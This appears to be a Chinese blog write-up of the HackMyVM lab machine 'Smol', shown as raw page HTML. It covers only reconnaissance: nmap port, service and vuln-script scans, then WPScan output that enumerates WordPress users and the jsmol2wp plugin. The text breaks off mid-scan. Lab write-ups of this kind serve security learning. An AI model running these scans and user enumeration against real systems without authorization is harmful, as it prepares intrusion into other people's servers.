<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Smol.

 https://hackmyvm.eu/machines/machine.php?vm=Smol
 

Notes: I hope you will enjoy it.

信息收集









渗透

优先级 `80`  `22`

web 渗透

访问一下`web`页面（需要修改一下`hosts`文件，把域名指向靶机`IP`）

通过`Wappalyzer`可以看到是用`W..." data-next-head=""/><meta property="og:title" content="HackMyVM - Smol" data-next-head=""/><meta property="og:description" content="Smol.

 https://hackmyvm.eu/machines/machine.php?vm=Smol
 

Notes: I hope you will enjoy it.

信息收集









渗透

优先级 `80`  `22`

web 渗透

访问一下`web`页面（需要修改一下`hosts`文件，把域名指向靶机`IP`）

通过`Wappalyzer`可以看到是用`W..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/04/03/HackMyVMSmol" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-03" data-next-head=""/><meta property="article:modified_time" content="2025-04-03" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="HackMyVM" data-next-head=""/><meta property="article:tag" content="Linux靶机" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackMyVM - Smol" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/04/03/HackMyVMSmol" data-next-head=""/><title data-next-head="">HackMyVM - Smol</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-cfd5476bab53b42b.js" defer=""></script><script src="/_next/static/0QnArrLpf1pqsE_vMSfi-/_buildManifest.js" defer=""></script><script src="/_next/static/0QnArrLpf1pqsE_vMSfi-/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">HackMyVM - Smol</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-03</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-03<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">HackMyVM</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Linux靶机</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMSmol","contentHtml":"\u003ch1\u003eSmol.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Smol\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Smol\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes: \u003cstrong\u003eI hope you will enjoy it.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e信息收集\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-05 01:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00030\u003c/span\u003es latency).\nMAC Address: 0A:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00024\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:4C:6C:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00031\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e75\u003c/span\u003e:EE:3F (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-05 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00039\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e75\u003c/span\u003e:EE:3F (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -sT -sV -A -T4 \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e  \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-05 01:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www.smol.hmv (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e)\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00044\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e998\u003c/span\u003e closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003ep1 Ubuntu 4ubuntu0\u003cspan class=\"hljs-number\"\u003e.9\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n| ssh-hostkey: \n|   \u003cspan class=\"hljs-number\"\u003e3072\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e:5f:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e:4b:4a:\u003cspan class=\"hljs-number\"\u003e91\u003c/span\u003e:9b:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:7a:\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:c8:4c:2e:04 (RSA)\n|   \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e 0a:4b:b9:b1:\u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e:d2:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e79\u003c/span\u003e:fc:2f:8a:3d:\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e:3a:ad:\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e (ECDSA)\n|_  \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e d3:3b:\u003cspan class=\"hljs-number\"\u003e97\u003c/span\u003e:ea:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:bc:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:4d:03:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e:f6:8f:ad:b6:a0:fb (ED25519)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.41\u003c/span\u003e ((Ubuntu))\n|_http-generator: WordPress \u003cspan class=\"hljs-number\"\u003e6.3\u003c/span\u003e\n|_http-server-header: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.41\u003c/span\u003e (Ubuntu)\n|_http-title: AnotherCTF\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e75\u003c/span\u003e:EE:3F (Oracle VirtualBox virtual NIC)\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003eX|\u003cspan class=\"hljs-number\"\u003e5.\u003c/span\u003eX\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.8\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e0.44\u003c/span\u003e ms www.smol.hmv (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e   \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-05 01:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00042\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp ports (reset)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e DOM based XSS.\n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\nMAC Address: 08:00:27:75:EE:3F (Oracle VirtualBox virtual NIC)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e渗透\u003c/h2\u003e\n\u003cp\u003e优先级 \u003ccode\u003e80\u003c/code\u003e \u003e \u003ccode\u003e22\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003eweb 渗透\u003c/h3\u003e\n\u003cp\u003e访问一下\u003ccode\u003eweb\u003c/code\u003e页面（需要修改一下\u003ccode\u003ehosts\u003c/code\u003e文件，把域名指向靶机\u003ccode\u003eIP\u003c/code\u003e）\u003c/p\u003e\n\u003cp\u003e通过\u003ccode\u003eWappalyzer\u003c/code\u003e可以看到是用\u003ccode\u003eWordPress 6.3\u003c/code\u003e搭建的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMSmol/image48.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eWPScan\u003c/h3\u003e\n\u003cp\u003e因为是使用WordPress搭建的，就可以使用\u003ccode\u003eWPScan\u003c/code\u003e 来扫描了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewpscan --url http://www.smol.hmv -eu                                                                                                                     \n_______________________________________________________________               \n         __          _______   _____                                          \n         \\ \\        / /  __ \\ / ____|                                         \n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®                        \n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | \u003cspan class=\"hljs-string\"\u003e'_ \\                                                                                                        \n            \\  /\\  /  | |     ____) | (__| (_| | | | |                                                                                                       \n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|    \n                                                                                                                                                             \n         WordPress Security Scanner by the WPScan Team                        \n                         Version 3.8.27                                      \n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                        \n_______________________________________________________________               \n                                                                              \n[+] URL: http://www.smol.hmv/ [192.168.56.16]         \n[+] Started: Wed Feb  5 02:12:38 2025                                         \n                                                                              \nInteresting Finding(s):                                                       \n                                                                                                                                                             \n[+] Headers                                                                                                                                                  \n | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)                          \n | Found By: Headers (Passive Detection)\n | Confidence: 100%                                                           \n                                                                              \n[+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php      \n | Found By: Direct Access (Aggressive Detection)             \n | Confidence: 100%                                                                                                                                          \n | References:                                                                \n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                                \n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/                                                                       \n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/                                                                    \n                                                                              \n[+] WordPress readme found: http://www.smol.hmv/readme.html                   \n | Found By: Direct Access (Aggressive Detection)                             \n | Confidence: 100%                                                           \n                                                                                                                                                             \n[+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/                                                                            \n | Found By: Direct Access (Aggressive Detection)         \n | Confidence: 100%                                                                                                                                          \n                                                                              \n[+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php \n | Found By: Direct Access (Aggressive Detection)                             \n | Confidence: 60%                                                            \n | References:                                                                \n |  - https://www.iplocation.net/defend-wordpress-from-ddos                   \n |  - https://github.com/wpscanteam/wpscan/issues/1299                        \n                                                                              \n[+] WordPress version 6.3 identified (Insecure, released on 2023-08-08).      \n | Found By: Rss Generator (Passive Detection)                                \n |  - http://www.smol.hmv/index.php/feed/, \u0026#x3C;generator\u003ehttps://wordpress.org/?v=6.3\u0026#x3C;/generator\u003e                                                               \n |  - http://www.smol.hmv/index.php/comments/feed/, \u0026#x3C;generator\u003ehttps://wordpress.org/?v=6.3\u0026#x3C;/generator\u003e                                                      \n                                                                              \n[+] WordPress theme in use: popularfx                                         \n | Location: http://www.smol.hmv/wp-content/themes/popularfx/                 \n | Last Updated: 2024-11-19T00:00:00.000Z                                     \n | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt\n | [!] The version is out of date, the latest version is 1.2.6                \n | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5                                                                            \n | Style Name: PopularFX                                                      \n | Style URI: https://popularfx.com                                           \n | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ...                                      \n | Author: Pagelayer                     \n | Author URI: https://pagelayer.com                                                                                                                         \n |                                                                                                                                                           \n | Found By: Css Style In Homepage (Passive Detection)                        \n |                                                                            \n | Version: 1.2.5 (80% confidence)                                            \n | Found By: Style (Passive Detection)                                        \n |  - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: '\u003c/span\u003eVersion: \u003cspan class=\"hljs-number\"\u003e1.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e'                                                           \n                                                                                                                                                             \n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 \u0026#x3C;===============================================================================\u003e (10 / 10) 100.00% Time: 00:00:00\n                                                                              \n[i] User(s) Identified:                                                       \n                                                                              \n[+] think                                                                     \n | Found By: Author Posts - Author Pattern (Passive Detection)                \n | Confirmed By:                                                              \n |  Wp Json Api (Aggressive Detection)                                        \n |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100\u0026#x26;page=1 \n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)           \n |  Login Error Messages (Aggressive Detection)                               \n                                                                                                                                                             \n[+] wp                                                                                                                                                       \n | Found By: Author Posts - Author Pattern (Passive Detection)                \n | Confirmed By:                                                              \n |  Wp Json Api (Aggressive Detection)                                        \n |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100\u0026#x26;page=1 \n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)  \n                                                                              \n[+] Jose Mario Llado Marti                                                                                                                                   \n | Found By: Rss Generator (Passive Detection)                                \n                                                                              \n[+] wordpress user                                                                                                                                           \n | Found By: Rss Generator (Passive Detection)  \n[+] admin                                                                                                                                                    \n | Found By: Wp Json Api (Aggressive Detection)                               \n |  - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100\u0026#x26;page=1  \n | Confirmed By:                                                              \n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)           \n |  Login Error Messages (Aggressive Detection)                                                                                                              \n                                                                                                                                                             \n[+] gege                                                                      \n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)                                                                                 \n | Confirmed By: Login Error Messages (Aggressive Detection)                  \n                                                                              \n[+] diego                                                                     \n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)  \n | Confirmed By: Login Error Messages (Aggressive Detection)                  \n                                                                              \n[+] xavi                                                                      \n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)  \n | Confirmed By: Login Error Messages (Aggressive Detection)                  \n\n[i] Plugin(s) Identified:                                                     \n                                                                              \n[+] jsmol2wp                                                                  \n | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/                 \n | Latest Version: 1.07 (up to date)                                          \n | Last Updated: 2018-03-09T10:28:00.000Z             \n |                                     \n | Found By: Urls In Homepage (Passive Detection)                             \n |                                                                            \n | Version: 1.07 (100% confidence)                                                                                                                           \n | Found By: Readme - Stable Tag (Aggressive Detection)                                                                                                      \n |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt              \n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)            \n |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt \n                                                                              \n[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                           \n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register                                                        \n                                                                              \n[+] Finished: Wed Feb  5 02:12:41 2025                                        \n[+] Requests Done: 65                                                         \n[+] Cached Requests: 6                                                        \n[+] Data Sent: 17.352 KB                